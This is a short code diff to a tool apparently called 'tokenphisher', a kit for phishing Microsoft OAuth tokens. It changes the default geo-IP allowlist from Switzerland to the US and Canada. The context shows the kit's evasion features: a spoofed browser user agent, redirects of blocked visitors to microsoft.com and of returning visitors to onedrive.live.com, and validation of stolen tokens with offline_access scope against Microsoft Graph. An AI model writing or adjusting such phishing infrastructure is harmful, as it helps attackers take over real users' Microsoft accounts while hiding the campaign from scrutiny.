@@ -57,7 +57,7 @@ const DEFAULT_CONFIG = {
   caFilePath: '/var/lib/tokenphisher/certs/example.com/chain.pem',
   userAgent:
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
-  geoipallowlist: ['CH'],
+  geoipallowlist: ['US', 'CA'],
   validateTokens: true,
   graphValidationScope: 'https://graph.microsoft.com/.default offline_access',
 };
@@ -89,7 +89,7 @@ Common options:
   --force-renew                 Request a new certificate even if a valid one exists
   --redirect-url <url>          Override redirect for / and blocked geo IPs (default: microsoft.com)
   --already-logged-in-url <url> Override return-visitor redirect (default: onedrive.live.com)
-  --geoip <codes>               Comma-separated ISO country codes (default: CH)
+  --geoip <codes>               Comma-separated ISO country codes (default: US,CA)
   --client-id <id>              Override OAuth client ID (default: MS Office public client)
   --scopes <scopes>             OAuth scopes (space-separated)
   --debug                       Enable debug logging
